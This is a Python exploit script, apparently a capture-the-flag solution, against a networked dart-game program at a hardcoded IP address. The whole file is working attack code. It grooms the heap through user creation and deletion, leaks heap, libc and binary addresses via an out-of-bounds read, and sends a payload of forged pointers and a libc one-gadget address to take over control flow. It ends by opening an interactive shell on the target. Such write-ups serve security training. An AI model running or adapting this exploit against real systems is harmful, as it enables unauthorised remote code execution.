from pwnlib import *
import random

# Fun_Fun_Dartgame:)

#s = Socket(("localhost", 6767))
s = Socket(("110.10.212.140", 5959))

def make_user(user, password, info):
	print "make user"
	s.ru("your ID : ")
	s.send("%s\n" % user)

	s.ru("assword : ")
	s.send("%s\n" % password)

	s.ru("assword : ")
	s.send("%s\n" % password)

	s.ru("rmation : ")
	s.send("%s\n" % info)
	s.ru("4. Exit\n> ")

def login():
	print "Login"
	s.send("1\n")
	s.ru("your ID : ")
	s.send("a\n")
	s.ru("assword : ")
	s.send("a\n")
	s.ru(" Manage\n> ")

def hit():
	print "hit"
	buf = ""
	while True:
		buf += s.recv(1)
		if "Hit" in buf:
			return True
		if "Out" in buf:
			return False

def practice(target, limit=20):
	print "practicing.."
	s.send("1\n")
	score = 501
	for i in range(limit):
		s.send("%d\n" % target)
	s.send("48\n")
	s.ru("!\nExit?\n> ")
	s.send("1\n")
	s.ru(" Manage\n> ")

def play():
	print "playing..."
	s.send("2\n")

	s.ru("ore : 501\n")
	s.send("50\n")

	s.ru("r hit 50!\n")
	s.send("50\n")

	s.ru("r hit 50!\n")
	s.send("50\n")

	s.ru("ore : 351\n")
	s.send("50\n")

	s.ru("r hit 50!\n")
	s.send("50\n")

	s.ru("r hit 50!\n")
	s.send("50\n")

	s.ru("ore : 201\n")
	s.send("50\n")

	s.ru("r hit 50!\n")
	s.send("50\n")

	s.ru("r hit 50!\n")
	s.send("50\n")

	s.ru("core : 51\n")
	s.send("50\n")

	s.ru("r hit 50!\n")
	s.send("1\n")
	time.sleep(0.5)

	return "You win" in s.recv()


make_user("a", "a", "X"*0x20)

# make some more
s.send("2\n")

USER = "B"*0x4
PASS = "C"*8
make_user(USER, PASS, "D"*0x40)
s.send("2\n")
make_user("1", "1", "H"*0x30)

# delete the BBBB
s.send("3\n")
s.ru("a delete? ")
s.send(USER + "\n")
s.ru("assword : ")
s.send(PASS + "\n")
s.ru("4. Exit\n> ")


login()


# go to management
s.send("3\n")
s.ru("5. Exit\n> ")

# find the heap
def leak(n):
	s.send("3\n")
	s.ru("anna see? ")
	s.send("%d\n" % n)
	s.ru("ctories\n> ")
	s.send("1\n")
	s.ru("Card ID : ")
	addr = int(s.ru("\n"), 16)
	s.ru("5. Exit\n> ")
	return addr

heap_addr = leak(0)
libc_addr = leak(587)

libc_base = libc_addr - 0x3c3ba8


print "heap: 0x%x" % heap_addr
print "libc: 0x%x" % libc_addr

s.send("3\n")
s.ru("anna see? ")
s.send("6\n")
s.ru("ctories\n> ")
s.send("3\n")
s.ru("Information : ")

bin_base = uq(s.ru("0a312e".decode("hex")).ljust(8, '\0')) - 0x1a14

s.ru("5. Exit\n> ")

print "bin:  0x%x" % bin_base

# go back
s.send("5\n")
s.ru(" Manage\n> ")

practice(1, 29)
practice(1, 29)
practice(1, 29)
practice(1, 29)
practice(1, 29)
practice(1, 29)
practice(50)

while True:
	if play():
		print "WIN"
		break


s.send("3\n")

s.ru("5. Exit\n> ")
s.send("4\n")


s.ru("4. Exit\n> ")
s.send("3\n")

#LEN = int(sys.argv[1])

# targets = [0x4526a, 0xf5b10, 0xf0567, 0xef6c4, 0xcc618, 0xcc543]
# index = random.randint(0, 5)
# target = targets[index] + random.randint(-50, 50)
# print "TARGET:", target
# target += libc_base

target = bin_base + 0x3877

payload = bytearray(pattern(0x20 + 8*3))
payload[0:8] = pq((heap_addr + 0x1168) - 0x10)
payload[8:16] = pq(target) # pc
payload[16:24] = pq(bin_base + 0x218e)
payload[0x18:0x20] = pq(libc_base + 0xef6c4) # 1
payload[0x20:0x28] = pq(0xdeadbee2) # 2
payload[0x30:0x38] = pq(0xdeadbee3)

s.ru("a delete? ")
s.send(payload + "\n")

s.ru("4. Exit\n> ")
s.send("2\n")

s.ru(" Manage\n> ")
s.send("1\n")



#s.ru("4. Exit\n> ")
#s.send("2\n")

s.interact()
